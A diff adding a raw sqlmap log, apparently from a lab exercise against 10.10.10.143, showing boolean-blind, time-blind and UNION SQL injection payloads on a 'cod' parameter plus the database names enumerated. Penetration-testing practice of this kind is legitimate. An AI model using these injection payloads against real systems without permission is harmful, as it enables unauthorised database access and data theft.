@@ -1,0 +1,54 @@
+        ___
+       __H__
+ ___ ___[)]_____ ___ ___  {1.3.8#stable}
+|_ -| . ["]     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 09:42:36 /2019-10-10/
+
+[09:42:36] [INFO] resuming back-end DBMS 'mysql' 
+[09:42:36] [INFO] testing connection to the target URL
+[09:42:37] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: cod (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: cod=1 AND 5344=5344
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: cod=1 AND (SELECT 1100 FROM (SELECT(SLEEP(5)))EzCA)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 7 columns
+    Payload: cod=-9866 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71706b7171,0x5a48626b67576f6561514c4d4c7453626b494762704e654e4359455564484e644968747a7a644247,0x716a6b6a71),NULL,NULL,NULL-- oXGg
+---
+[09:42:37] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Debian 9.0 (stretch)
+web application technology: PHP, Apache 2.4.25
+back-end DBMS: MySQL >= 5.0.12
+[09:42:37] [INFO] fetching database names
+[09:42:37] [INFO] used SQL query returns 6 entries
+[09:42:37] [INFO] resumed: 'hotel'
+[09:42:37] [INFO] resumed: 'information_schema'
+[09:42:37] [INFO] resumed: 'mysql'
+[09:42:37] [INFO] resumed: 'performance_schema'
+[09:42:37] [INFO] resumed: 'rdtzf'
+[09:42:37] [INFO] resumed: 'wiuhd'
+available databases [6]:
+[*] hotel
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] rdtzf
+[*] wiuhd
+
+[09:42:37] [INFO] fetched data logged to text files under '/root/.sqlmap/output/10.10.10.143'
+[09:42:37] [WARNING] you haven't updated sqlmap for more than 68 days!!!
+
+[*] ending @ 09:42:37 /2019-10-10/
+
